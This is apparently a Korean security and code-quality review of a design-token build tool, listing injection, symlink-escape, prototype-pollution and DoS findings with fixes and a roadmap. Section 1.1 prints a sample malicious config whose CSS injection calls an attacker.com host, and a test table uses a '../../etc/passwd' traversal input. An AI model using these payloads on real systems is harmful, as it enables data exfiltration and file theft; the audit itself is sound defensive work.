# figma-token-bridge 진단 보고서

> 작성일: 2026-02-27
> 대상: `packages/figma-token-bridge` v0.1.0
> 리뷰 범위: 보안(Security) · 코드품질(Quality) · 아키텍처(Architecture)
> 빌드 상태: ESM/CJS/DTS build success, TypeScript 0 errors, 41/41 tests pass
> 커버리지: Statements 84.69% / **Branches 61.16%** / Functions 92.45% / Lines 89.01%

---

## 종합 평가

| 관점         | 등급      | 핵심 지적                                                                     |
| ------------ | --------- | ----------------------------------------------------------------------------- |
| **보안**     | HIGH RISK | CSS injection CRITICAL + symlink/prototype/DoS 4건 HIGH                       |
| **코드품질** | WARN      | `resolveAliasToVar` tier 하드코딩 버그, 중복 헬퍼 구조, 브랜치 커버리지 미흡  |
| **아키텍처** | WARN      | AFDS 통합 전 3건 블로커, `GenerateResult` 미노출, TS 생성기 카테고리 하드코딩 |

**AFDS 통합 전 반드시 해결해야 할 항목: 6건** (보안 3 + 기능 버그 2 + API 누락 1)

---

## 1. 보안 진단

### 1.1 CRITICAL — CSS Injection via `namespace` / `selector` / 토큰 키

**위치:** `src/transform/to-css.ts:32,37,85` / `src/config.ts:13,25`

`CSS_UNSAFE_RE = /[;{}]/` 검증이 `token.$value`에만 적용되고, `namespace`·`selector` 필드와 토큰 JSON 키는 검증 없이 CSS 출력에 삽입된다.

```ts
// to-css.ts:32 — namespace가 CSS 변수명에 직접 삽입
return `--${category}-${namespace}-${rest.join('-')}`

// to-css.ts:85 — selector가 CSS 블록 헤더로 직접 삽입
return `${selector} {\n${lines.join('\n')}\n}`
```

악의적 config 예시:

```ts
export default defineConfig({
  namespace: 'afds} body{background:url(https://attacker.com/?x=',
  tiers: {
    dark: {
      selector: '.dark} @import url(https://attacker.com/evil.css); .x{',
    },
  },
})
```

**수정 방향:**

```ts
const NAMESPACE_RE = /^[a-z][a-z0-9-]{0,63}$/
const CSS_VAR_KEY_RE = /^[a-zA-Z][a-zA-Z0-9_-]*$/

// generate.ts 또는 cli/index.ts 진입 시점에서 검증
function assertSafeNamespace(ns: string): void {
  if (!NAMESPACE_RE.test(ns)) throw new Error(`Invalid namespace: '${ns}'`)
}
// flattenTokens에서 키 검증 또는 to-css.ts에서 키 sanitize
```

---

### 1.2 HIGH — Symlink 탈출로 `assertWithinBase` 우회

**위치:** `src/generate.ts:35-40`

`path.resolve()`는 심볼릭 링크를 따르지 않는다. configDir 내부의 심볼릭 링크가 외부를 가리켜도 `startsWith()` 검사를 통과하고, `fs.readFileSync`가 실제 외부 파일을 읽는다.

```ts
// 현재 — symlink 방어 없음
function assertWithinBase(resolved: string, base: string, label: string): void {
  const normalizedBase = path.resolve(base) + path.sep
  if (!resolved.startsWith(normalizedBase)) { ... }
}

// 수정 — realpathSync로 심볼릭 링크 해소
function assertWithinBase(resolved: string, base: string, label: string): void {
  const normalizedBase = path.resolve(base) + path.sep
  let real: string
  try {
    real = fs.realpathSync(resolved)
  } catch {
    real = fs.realpathSync(path.dirname(resolved)) + path.sep + path.basename(resolved)
  }
  if (!real.startsWith(normalizedBase)) { throw ... }
}
```

---

### 1.3 HIGH — Prototype Pollution via `JSON.parse`

**위치:** `src/schema/validate.ts:256`

`JSON.parse(content)` 이후 `__proto__`·`constructor`·`prototype` 키 필터링 없음. 오염된 `Object.prototype`이 `isDtcgToken`의 `'$value' in value` 검사를 오염시킬 수 있다.

```ts
// 수정 — reviver로 위험 키 차단
const parsed = JSON.parse(content, (key, value) => {
  if (key === '__proto__' || key === 'constructor' || key === 'prototype') return undefined
  return value
})
```

---

### 1.4 HIGH — Dynamic `import()` 범위 무제한

**위치:** `cli/index.ts:50`

`--config` 인수에 절대경로(`/tmp/evil.mjs`)를 전달하면 `import()` 실행 시점에 모듈 최상위 코드가 실행된다. `isValidConfig` 검사는 import 이후에 이루어진다.

```ts
// 수정 — import 전 경계 검사
const resolved = path.resolve(process.cwd(), configPath)
if (!resolved.startsWith(process.cwd() + path.sep)) {
  console.error('Config file must be within the current working directory.')
  return null
}
const mod = await import(pathToFileURL(resolved).href)
```

---

### 1.5 HIGH — O(N²) Alias 순환 탐지 (DoS)

**위치:** `src/resolvers/alias.ts:14-31`

`detectCircularAlias`는 per-entry로 `new Set()`과 함께 호출된다. N개 alias 체인에서 O(N²) traversal이 발생한다. `FLATTEN_MAX_DEPTH = 20`은 JSON 중첩을 제한하지만, flat 구조에서의 긴 alias 체인은 차단하지 못한다.

```ts
// 수정 — 전체 aliasMap에 대한 단일 패스 순환 탐지
function detectAllCircularAliases(aliasMap: Map<string, string>): Set<string> {
  const globalVisited = new Set<string>()
  const circular = new Set<string>()
  for (const start of aliasMap.keys()) {
    if (globalVisited.has(start)) continue
    const chain = new Set<string>()
    let cur: string | undefined = start
    while (cur && !globalVisited.has(cur)) {
      if (chain.has(cur)) {
        chain.forEach(n => circular.add(n))
        break
      }
      chain.add(cur)
      globalVisited.add(cur)
      const next = aliasMap.get(cur)
      cur = next && ALIAS_PATTERN.test(next) ? extractAliasPath(next) : undefined
    }
  }
  return circular
}
```

---

### 1.6 MEDIUM — TypeScript 코드 인젝션 (토큰 키 → TS 문자열 리터럴)

**위치:** `src/transform/to-ts.ts:21-22,29`

토큰 path(JSON 키 조합)가 단순따옴표 이스케이프 없이 TS 소스에 삽입된다. 악의적 키가 TS 파일을 오염시키고 빌드 파이프라인을 통해 실행될 수 있다.

```ts
// 현재
const items = values.map(v => `  '${v}'`).join(',\n')

// 수정 — 이스케이프 또는 upstream 키 검증
const items = values.map(v => `  '${v.replace(/\\/g, '\\\\').replace(/'/g, "\\'")}'`).join(',\n')
```

---

### 1.7 MEDIUM — 절대 경로 노출 (에러 메시지)

**위치:** `src/generate.ts:53,98-99`

`ValidationMessage.location`과 오류 메시지에 `/Users/<user>/...` 같은 절대 경로가 포함되어 공개 API 계약의 일부로 노출된다.

```ts
// 수정
const displayPath = path.relative(configDir, resolved) || resolved
return { file: null, error: `Source file not found: ${displayPath}` }
```

---

### 1.8 보안 종합 체크리스트

| #   | 항목                                          | 상태                   |
| --- | --------------------------------------------- | ---------------------- |
| 1   | `namespace`/`selector` CSS injection 방어     | ❌ CRITICAL            |
| 2   | Symlink escape — `realpathSync` 미적용        | ❌ HIGH                |
| 3   | Prototype pollution — JSON.parse reviver 없음 | ❌ HIGH                |
| 4   | Dynamic `import()` CWD 범위 미제한            | ❌ HIGH                |
| 5   | O(N²) alias 순환 탐지                         | ❌ HIGH                |
| 6   | TS 코드 인젝션 — 토큰 키 이스케이프 없음      | ❌ MEDIUM              |
| 7   | 절대 경로 에러 메시지 노출                    | ❌ MEDIUM              |
| 8   | `readFileSync` 파일 크기 제한 없음            | ❌ MEDIUM              |
| 9   | `isValidConfig`의 namespace 포맷 검증 미흡    | ❌ LOW                 |
| 10  | `hardcoded secrets` 없음                      | ✅ PASS                |
| 11  | `pathToFileURL`로 `javascript:` URI 방어      | ✅ PASS                |
| 12  | `FLATTEN_MAX_DEPTH = 20` JSON 재귀 제한       | ✅ PASS                |
| 13  | `assertWithinBase` 경로 탈출 방어 (기본)      | ✅ PASS (symlink 제외) |

---

## 2. 코드품질 진단

### 2.1 CRITICAL — `resolveAliasToVar` tier 하드코딩 버그

**위치:** `src/transform/to-css.ts:44-48`

```ts
function resolveAliasToVar(alias: string, namespace: string): string {
  const cssVar = pathToCssVar(aliasPath, 'primitive', namespace) // 항상 'primitive'
  return `var(${cssVar})`
}
```

이 함수는 dark tier 토큰에서도 호출된다(`generateRootBlock:79-81`). dark tier 토큰의 alias가 semantic 토큰을 참조할 경우 잘못된 CSS 변수명이 생성된다.

예: dark tier `{ $value: '{color.surface}', $type: 'color' }`
현재 출력: `var(--color-afds-surface)` (존재하지 않는 primitive 변수)
올바른 출력: `var(--afds-color-surface)` (semantic 변수)

현재 테스트(`tests/transform.test.ts:132-133`)는 우연히 primitive 경로와 일치하는 케이스만 검증해 이 버그를 잡지 못한다.

**수정 방향:** `resolveAliasToVar(alias, namespace, sourceTier)` 파라미터 추가하거나, dark alias 해석 시 semantic 네이밍 규칙 적용.

---

### 2.2 CRITICAL — `flattenTokens` throw가 validator에서 uncaught

**위치:** `src/schema/dtcg.schema.ts:62-63`

```ts
if (prefix.length >= FLATTEN_MAX_DEPTH) {
  throw new Error(`Token nesting too deep (max ${FLATTEN_MAX_DEPTH} levels): ...`)
}
```

`validatePrimitive`, `validateSemantic`, `validateDark`, `generate.ts:loadJson` 어디에서도 이 예외를 catch하지 않는다. 20단계 이상 중첩 토큰 파일이 들어오면 ValidationResult 대신 uncaught exception으로 CLI가 비정상 종료된다.

**수정 방향:** throw 대신 빈 배열과 에러 플래그 반환, 또는 각 validator에서 try-catch로 E005 레벨 에러로 변환.

---

### 2.3 CRITICAL — `loadJson` null 상태 silent skip

**위치:** `src/generate.ts:130`

```ts
const { file, error } = loadJson(tiers.primitive.source, configDir)
if (error) return makeLoadErrorResult(...)
primitiveFile = file ?? undefined  // error=null & file=null 상태 silent skip
```

`{ file: DtcgFile | null; error: string | null }` 타입에서 `error === null && file === null`이 타입상 가능하다. 이 경우 검증 단계가 조용히 건너뛰어진다.

**수정:** discriminated union 반환 타입으로 변경

```ts
type LoadResult = { file: DtcgFile; error: null } | { file: null; error: string }
```

---

### 2.4 HIGH — 에러 헬퍼 3종 중복

**위치:** `src/generate.ts:62-85`

```ts
function makeLoadErrorResult(source, message): GenerateResult // E006
function makeLoadErrorValidation(source, message): ValidationResult // E006
function makeWriteErrorResult(source, message): GenerateResult // E008
```

차이는 에러 코드와 반환 타입뿐. 새 에러 코드마다 새 함수가 생기는 구조다.

**수정:**

```ts
function makeErrorValidation(code: string, src: string, msg: string): ValidationResult { ... }
function makeErrorResult(code: string, src: string, msg: string): GenerateResult {
  return { ok: false, validation: makeErrorValidation(code, src, msg), generated: [] }
}
```

---

### 2.5 HIGH — `generate()` / `validate()` JSON 로딩 로직 중복

**위치:** `src/generate.ts:109-233`

두 함수가 동일한 tier 로딩 패턴을 각각 구현한다. 미묘한 구조 차이도 존재: `validate()`에서 `validatePrimitive` 호출이 if 블록 **안**에 있지만 `generate()`에서는 **밖**에 있다.

**수정:** 공통 `loadTiers()` 내부 함수 추출 후 공유.

---

### 2.6 HIGH — `to-ts.ts` Zod import 무조건 생성

**위치:** `src/transform/to-ts.ts:8-15`

```ts
const GENERATED_HEADER = `...
import { z } from 'zod'
`
```

`useZod: false`이어도 `import { z } from 'zod'`가 생성된다. zod 미설치 프로젝트에서 TypeScript 컴파일 오류 발생.

---

### 2.7 MEDIUM — `to-ts.ts` color/spacing/radius 카테고리 하드코딩

**위치:** `src/transform/to-ts.ts:67-104`

`shadow`, `string`, `number`, `boolean` 카테고리 토큰이 TypeScript 생성에서 무시된다. AFDS의 typography 토큰 미처리 원인.

---

### 2.8 브랜치 커버리지 갭 (현재 61.16%)

미테스트 핵심 경로 목록:

| 파일             | 미테스트 경로               | 추가할 테스트                               |
| ---------------- | --------------------------- | ------------------------------------------- |
| `generate.ts`    | W004 (빈 tiers)             | `tiers: {}` config로 generate/validate 호출 |
| `generate.ts`    | assertWithinBase 에러       | `source: '../../etc/passwd'` → E006 확인    |
| `generate.ts`    | E008 write 실패             | `fs.writeFileSync` spy throw → E008 확인    |
| `validate.ts`    | E004 순환 참조              | `a → b → a` alias chain                     |
| `validate.ts`    | E003 힌트 포함              | `{color.nonexistent}` → available 힌트 확인 |
| `validate.ts`    | I001 미사용 primitive       | semantic 미참조 primitive → infos 확인      |
| `validate.ts`    | E002 허용되지 않은 type     | `$type: 'gradient'` → E002                  |
| `validate.ts`    | E007 CSS injection          | `$value: '#fff; color: red'` → E007         |
| `validate.ts`    | W002 $description 누락      | $description 없는 토큰 → W002               |
| `validate.ts`    | W003 primitive에서 alias    | primitive 토큰에 alias → W003               |
| `validate.ts`    | parseDtcgJson array/null    | `parseDtcgJson('[]')` → E005                |
| `dtcg.schema.ts` | flattenTokens 깊이 초과     | 20단계 중첩 → throw 확인                    |
| `to-ts.ts`       | useZod: false 분기          | union type 생성 형식 확인                   |
| `to-ts.ts`       | primitiveFile === undefined | semantic만 있을 때                          |

**목표: Branches 61.16% → 85%+**

---

## 3. 아키텍처 진단

### 3.1 AFDS 통합 전 블로커

**블로커 1 — Symlink path traversal (High)**
`assertWithinBase`에 `fs.realpathSync` 미적용 → 위 보안 섹션 1.2 참조

**블로커 2 — CSS selector/namespace injection (High)**
`generate.ts` 진입 시점 검증 없음 → 위 보안 섹션 1.1 참조

**블로커 3 — CLI config 경로 CWD 미제한 (Medium)**
`loadConfig`에서 CWD 범위 검사 없음 → 위 보안 섹션 1.4 참조

---

### 3.2 공개 API 갭

**`GenerateResult` 타입 미노출**

`src/index.ts`에서 `generate()`가 반환하는 `GenerateResult`가 export되지 않는다. 사용자가 반환 타입을 명시적으로 사용하려면 내부 경로(`dist/generate`)를 직접 참조해야 한다.

```ts
// src/index.ts에 추가
export type { GenerateResult } from './generate.js'
```

---

### 3.3 TypeScript 생성기 카테고리 하드코딩

**위치:** `src/transform/to-ts.ts:67-104`

`color`, `spacing`, `radius`만 처리. AFDS의 typography 토큰이 포함된 경우 TypeScript 파일에서 누락된다. `flattenTokens`의 카테고리 중립적 설계와 불일치한다.

**수정 방향:** `flattenTokens()` 결과의 최상위 키를 동적으로 순회하는 방식으로 교체.

---

### 3.4 스펙 갭

| 갭                                | 위치                      | 영향                                              |
| --------------------------------- | ------------------------- | ------------------------------------------------- |
| `_config` 파라미터 완전 무시      | `to-css.ts:108-115`       | `TierConfig.selector`가 semantic CSS에 반영 안 됨 |
| cross-tier alias 미지원           | `to-css.ts:44-48`         | dark → semantic alias가 잘못된 CSS 변수명 생성    |
| `watch` 모드 미구현               | `cli/index.ts:162-181`    | tech-spec.md CLI 명세와 불일치                    |
| I002 에러 코드 미구현             | `validate.ts`             | `error-strategy.md:55-57` 문서-구현 불일치        |
| `shadow`/`typography` 테스트 없음 | `tests/transform.test.ts` | 회귀 보호 없음                                    |

---

### 3.5 모듈 경계 평가

**강점:**

- `dtcg.schema.ts`가 최하위 leaf로 고정, 순환 의존성 없음
- `validateTokenBase()` 공통 추출로 E001/E002/E007 공유
- `mergeResults()`로 다중 ValidationResult 병합 일관성 유지

**개선 가능 사항:**

- `generate.ts`가 orchestrator이면서 파일 I/O를 직접 수행 — I/O 어댑터 분리 시 단위 테스트 용이
- `to-ts.ts`가 `TokenBridgeConfig` 전체를 받아 두 필드만 사용 — 필요한 값만 파라미터로 전달하도록 개선 가능
- 플러그인 주입 지점 없음 — SCSS, Style Dictionary 포맷 추가 시 generate.ts 수정 필요

---

## 4. 우선순위 로드맵

### Phase 1 — 통합 전 필수 (Blocker)

| 우선순위 | 항목                                            | 파일                               | 난이도  |
| -------- | ----------------------------------------------- | ---------------------------------- | ------- |
| P0       | CSS injection — namespace/selector/키 검증 추가 | `to-css.ts`, `generate.ts`         | Low     |
| P0       | Symlink escape — `realpathSync` 적용            | `generate.ts:35-40`                | Low     |
| P0       | TypeScript injection — 토큰 키 이스케이프/검증  | `to-ts.ts:21-22`, `dtcg.schema.ts` | Low     |
| P1       | Dynamic import CWD 범위 제한                    | `cli/index.ts:43-61`               | Low     |
| P1       | `resolveAliasToVar` tier 하드코딩 수정          | `to-css.ts:44-48`                  | Medium  |
| P1       | `flattenTokens` throw → graceful error          | `dtcg.schema.ts:62-63`             | Low     |
| P1       | `GenerateResult` 타입 export                    | `src/index.ts`                     | Trivial |

### Phase 2 — 품질 개선 (권장)

| 우선순위 | 항목                                     | 파일                  | 난이도 |
| -------- | ---------------------------------------- | --------------------- | ------ |
| P2       | `loadJson` discriminated union 반환 타입 | `generate.ts:42-58`   | Low    |
| P2       | `makeErrorResult/Validation` 통합        | `generate.ts:62-85`   | Low    |
| P2       | `loadTiers()` 공통 함수 추출             | `generate.ts:109-233` | Medium |
| P2       | `to-ts.ts` 카테고리 동적 처리            | `to-ts.ts:67-104`     | Medium |
| P2       | Zod import 조건부 생성                   | `to-ts.ts:8-15`       | Low    |
| P2       | Prototype pollution — JSON.parse reviver | `validate.ts:256`     | Low    |
| P2       | O(N²) alias 순환 탐지 → 단일 패스        | `resolvers/alias.ts`  | Medium |

### Phase 3 — 테스트 커버리지 (목표 85%+)

위 섹션 2.8의 미테스트 경로 순차 구현.

### Phase 4 — 장기 개선

- `_config.selector` semantic CSS에 반영
- `watch` 모드 구현
- I002 에러 코드 구현 또는 문서 제거
- 파일 크기 제한 (`readFileSync` 전 `statSync` 체크)
- 절대 경로 에러 메시지 → 상대 경로 변환
- 플러그인 주입 지점 설계 (SCSS, Style Dictionary 지원)

---

## 5. 잘된 점

현재 코드베이스에서 명확하게 잘 구현된 부분:

1. **`assertWithinBase` 경로 탈출 방어** — CLI 도구에서 흔히 누락되는 read/write 양방향 경계 검사 구현
2. **에러 코드 체계 E001-E008, W001-W004, I001** — 일관된 코드 체계로 문서 참조 가능
3. **`validateTokenBase` 공통 추출** — E001/E002/E007 검증을 세 validator에서 DRY하게 공유
4. **CSS var() 체인 방식** — 빌드타임 인라인 대신 런타임 참조로 dark mode cascade 올바르게 보장
5. **`FLATTEN_MAX_DEPTH = 20`** — 재귀 폭발 방어 의도 명확
6. **`pathToFileURL` 사용** — `javascript:` URI 주입 방어
7. **`isValidConfig` 런타임 검증** — 타입 안전성 경계 수호
8. **41/41 테스트 + 0 TypeScript 에러** — 기반 안정성 확보

---

## 참조 파일 위치

| 파일                        | 핵심 라인                                                                                                          |
| --------------------------- | ------------------------------------------------------------------------------------------------------------------ |
| `src/generate.ts`           | :35-40 (assertWithinBase), :62-85 (에러 헬퍼), :109-188 (generate), :194-233 (validate)                            |
| `src/schema/validate.ts`    | :44 (CSS_UNSAFE_RE), :50-82 (validateTokenBase), :256 (parseDtcgJson)                                              |
| `src/schema/dtcg.schema.ts` | :52-63 (FLATTEN_MAX_DEPTH + throw)                                                                                 |
| `src/resolvers/alias.ts`    | :14-31 (detectCircularAlias)                                                                                       |
| `src/transform/to-css.ts`   | :32,37 (namespace injection), :44-48 (resolveAliasToVar), :85 (selector injection), :108-115 (generateSemanticCss) |
| `src/transform/to-ts.ts`    | :8-15 (GENERATED_HEADER), :21-22 (TS injection), :67-104 (하드코딩 카테고리)                                       |
| `cli/index.ts`              | :43-61 (loadConfig CWD 미제한), :50 (dynamic import)                                                               |
| `src/index.ts`              | :1-10 (GenerateResult 미export)                                                                                    |
